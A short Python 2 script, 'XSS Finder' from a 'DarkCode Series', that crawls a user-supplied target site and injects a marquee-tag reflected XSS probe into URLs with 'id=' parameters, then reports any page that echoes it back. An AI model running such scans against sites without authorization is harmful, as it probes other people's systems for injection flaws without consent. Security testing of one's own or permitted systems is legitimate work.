#!/usr/bin/python
# -*- coding: utf-8 -*-
import re, urllib,urllib2, time, httplib, socket, sys, md5, locale
from urllib2 import Request, urlopen, URLError, HTTPError
from socket import *
import threading
from bs4 import BeautifulSoup
import urlparse
import mechanize
import webbrowser
import os



print """

DarkCode Series !

XSS Finder V 0.1

Coder : B3mB4m

"""


hedef = raw_input("Target : ")


url = hedef
tarayici = mechanize.Browser()
urls = [url]
gez = [url]

while len(urls)>0:
    try:
        tarayici.open(urls[0])
        urls.pop(0)
        for link in tarayici.links():
            yeniurl =  urlparse.urljoin(link.base_url,link.url)
            if yeniurl not in gez and url in yeniurl:
                gez.append(yeniurl)
                urls.append(yeniurl)
                #print yeniurl
                
                if "id=" in yeniurl:
                    purelink = yeniurl.split("=")
                    #Hocama teşekkürler ^_^
                    xss = purelink[0]+"""='">><marquee><h1>B3mB4m</h1></marquee>"""
                    uagent= {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.0.6)'}
                    req = urllib2.Request(xss, headers=uagent)
                    fd = urllib2.urlopen(xss)
                    data= fd.read()
                    if "B3mB4m" in data:
                        print "XSS FOUND !"
                        print ""
                        print xss
                        urls =0
                        sys.exit()
    
                else:
                   pass
                 
    except TypeError:
        pass
        #urls.pop(0)

    
        

print "Finish.."
